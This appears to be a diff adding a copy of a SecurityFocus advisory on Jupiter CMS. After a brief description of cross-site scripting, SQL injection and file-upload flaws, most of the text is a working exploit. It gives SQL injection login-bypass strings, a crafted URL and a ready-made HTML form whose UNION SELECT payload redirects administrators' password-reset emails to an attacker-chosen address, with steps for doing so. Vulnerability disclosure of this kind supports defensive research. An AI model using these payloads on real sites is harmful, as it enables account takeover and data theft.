@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/20048/info
+     
+Jupiter CMSA is prone to multiple input-validation vulnerabilities, including cross-site scripting, SQL-injection, and arbitrary file-upload issues, because the application fails to sanitize user-supplied input. 
+     
+A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, exploit vulnerabilities in the underlying database implementation, or upload and execute arbitrary files within the webserver process. Other attacks are also possible.
+ 
+if magic_quotes_gpc = off login with user name : ' or id=1/* or ' or authorization = 4/* 
+index.php?n=http://www.example.com/modules/register&a=3&d=3&key='%20or%20id=1/* 
+You will be able to change the password for any user .. know his id and put it in the url. -- or you can use this form by changing http://localhost/jupiter/ to the website dir to recive reset password email to all the administrators <form method="post" action="http://localhost/jupiter/index.php?n=http://www.example.com/modules/register"> <table class="main" cellspacing="1" cellpadding="4" width="100%"> <tr class="head"> <td colspan="2" class="head">Forgot your password?</td> </tr> <tr> <td class="con1" width="42%" valign="middle"><span class="hilight">Username:</span></td> <td class="con1" width="58%" valign="bottom"><input type="text" name="fpwusername" style="width:100%" class="box" tabindex="5" value="' union select id,authorization ,username ,password ,'security@soqor.net',url,age,flag,location,registered,lastvisit,forum_lastvisit,ip,forumposts,signature,aboutme,msn,yahoo,icq,aim,skype,avatar,hideemail,templates,ca lendarbday,status,multikey,actime from users where id=1or authorization=4/*"></td> </tr> <tr> <td class="con1"><input type="button" style="width:100" class="box" value="Back" onClick="window.history.go(-1);" tabindex="8"></td> <td class="con1" align="right"><input type="submit" style="width:100" class="box" value="Submit" tabindex="7"></td> </tr> <input type="hidden" name="a" value="3"> <input type="hidden" name="d" value="1"> </table> </form> put the user name value Change security@soqor.net to your email ' union select id,authorization ,username ,password ,'security@soqor.net',url,age,flag,location,registered,lastvisit,forum_lastvisit,ip,forumposts,signature,aboutme,msn,yahoo,icq,aim,skype,avatar,hideemail,templates,ca lendarbday,status,multikey,actime from users where id=1or authorization=4/* 
+ 
+
+
+ 
